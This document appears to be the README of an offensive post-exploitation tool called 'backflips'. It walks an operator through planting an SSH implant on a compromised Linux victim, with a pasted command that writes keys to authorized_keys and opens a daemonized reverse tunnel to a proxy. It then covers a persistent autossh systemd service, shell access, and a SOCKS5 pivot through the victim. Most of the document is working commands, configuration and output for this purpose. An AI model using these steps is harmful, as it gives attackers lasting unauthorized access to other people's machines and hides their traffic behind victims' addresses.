# Linux backflips

## `make_backflip.py`

runs on the attack machine that gives the cut-n-paste command to
run on victim

## `implant.py`

embedded in `install_implant.py` that daemonizes and makes ssh
connections. Note that the current implementation uses
`subprocess.Popen` with `shell=True`, which will cause an `execve`
with `sh -c` to appear in logs.

## `install_implant.py`

template of script that will be encoded and outputed as the
cut-n-paste command by `make_backflip.py`

# How to Setup a Backflip

In our examples, our victim is using the username `ubuntu` with a hostname of `markus-laptop` 
and our proxy01 external IP is at 10.50.0.1. 
We setup our reverse port-forwards are on ports 4000 onwards and our socks proxies are on ports 5000 onwards

1. Get a shell on victim host

1. run `make_backflip.py` on the attack host

	The invocation is `make_backflip.py <username> <victim-hostname> <c2_fqdn/ip> <reverse listen port>`.

	username: Username of the victim you are compromising. Stored locally in /opt/backflips on a proxy

	victim_host: Hostname of the MacOS host you are compromising. Stored locally in /opt/backflips on a proxy

	c2_fqdn/ip: The IP address or domain of the edge sketch node the backflip will connect through

	reverse listen port port: Port that forwards back to the victim (tcp/22). Use a range of 4000 and upwards. Track this on the Table for tracking backflips in an engagements infra.

	Assuming the victim username is ubuntu, hostname is markus-laptop and victim ip given
	above, and listen port 4000:

		sudo ./make_backflip.py ubuntu markus-laptop 10.50.0.1 4000

	This will make port 4000 on proxy01 with a remote connection to
	10.0.0.1 on 22 when the command that is outputed is run on the
	victim. This will also create a keypair on the attack machine in
	`/opt/backflip/keys` with the format `<username>-<victim-hostname>-<attacker-ip>`.
	Note that you will need to allocate a new port with each blackflip
	created.

1. run the command that `make_backflip.py` outputs on the victim

   You should see output like:

		[+] keypath: /home/ubuntu/.ssh/id_rsab
		[+] wrote private key: /home/ubuntu/.ssh/id_rsab
		[+] wrote public key: /home/ubuntu/.ssh/id_rsab.pub
		[+] wrote to ~/.ssh/authorized_keys
		[+] started daemonized tunnel
		[*] waiting one minute for tunnel to come up...
		[+] tunnel running

1. run `install_autossh_backflip.py` on the attack host

	`install_autossh_backflip.py` will create a systemd service to initiate the ssh
	connection to the victim and reverse port-forward a connection to
	their ssh daemon on the attack system. Additionally, it will setup a
	SOCKS5 proxy listening on a port you specify. As above, it is
	important to note which SOCKS port you are using and each backflip
	will require a unique one.

	In this example, we setup a persistant ssh connection with reverse
	forward as well as a socks proxy on port 5000:

		sudo ./install_autossh_backflip.py 4000 5000 /opt/backflips/keys/ubuntu-markus-laptop-10.50.0.1
		contents:
		[Unit]
		Description=ssh backflip to 4000
		After=network.target auditd.service

		[Service]
		ExecStart=/usr/bin/autossh -oServerAliveInterval=30 -oServerAliveCountMax=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oBatchMode=yes -n -N -D :5000 -i /opt/backflips/keys/ubuntu-markus-laptop-10.50.0.1 -p4000 ubuntu@localhost

		[Install]
		WantedBy=multi-user.target

		Created symlink /etc/systemd/system/multi-user.target.wants/backflip-4000-5000.service → /etc/systemd/system/backflip-4000-5000.service.

	You can see that the proxy and ssh backflip are up:

		$ sudo netstat -lntp | grep -E "4000|5000"
		tcp        0      0 0.0.0.0:4000            0.0.0.0:*               LISTEN      20612/sshd: flip
		tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      20693/ssh
		tcp6       0      0 :::4000                 :::*                    LISTEN      20612/sshd: flip
		tcp6       0      0 :::5000                 :::*                    LISTEN      20693/ssh

	Notice that ssh is listening on 0.0.0.0, meaning that these services
	are available throughout the subnet.

# How to Use a Backflip

There are two primary ways to use a backflip: shell access and proxy access.

## Get a Shell

`/opt/backflips/keys` contains the necessary  ssh keypairs to ssh into
the victim machine. However, the permissions on the directory are such
that a normal user cannot use them. Each key to be used must be copied
to your home directory with permissions and ownership as SSH
expects. In our example:
```
sudo cp /opt/backflips/keys/ubuntu-markus-laptop-10.50.0.1 ~/.ssh/
sudo chown $UID:$(id -g) ~/.ssh/ubuntu-markus-laptop-10.50.0.1
chmod 600 ~/.ssh/ubuntu-markus-laptop-10.50.0.1
```

Note, the user will be the same user as used above to setup the
backflip.

The following will reward you with a shell on the victim:
```
ssh -i ~/.ssh/ubuntu-markus-laptop-10.50.0.1 -p 4000 ubuntu@127.0.0.1
```

or just do it as root
```
sudo ssh -i ~/.ssh/ubuntu-markus-laptop-10.50.0.1 -p 4000 ubuntu@127.0.0.1
```

## Use a SOCKS5 Proxy

In our example above, there is a SOCKS5 proxy running on
port 5000. The most practical way to use it is with a browser plugin
such as foxyproxy or switchyomega. However, it is also available for
command line tools with the help of a proxy LD_PRELOAD library such as
`proxychains` or `tsocks`.

For example, a `proxychains.conf` in the current working directory
with contents as such:

	strict_chain
	# Quiet mode (no output from library)
	#quiet_mode
	proxy_dns

	# Some timeouts in milliseconds
	tcp_read_time_out 15000
	tcp_connect_time_out 8000

	[ProxyList]
	socks5  127.0.0.1 5000

We can verify that our SOCKS proxy works with curl as we see our
victim IP instead of our attack IP:

```
$ proxychains curl ifconfig.me; echo
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ifconfig.me
|S-chain|-<>-127.0.0.1:5000-<><>-4.2.2.2:53-<><>-OK
|DNS-response| ifconfig.me is 216.239.32.21
|S-chain|-<>-127.0.0.1:5000-<><>-216.239.32.21:80-<><>-OK
10.0.0.1
```
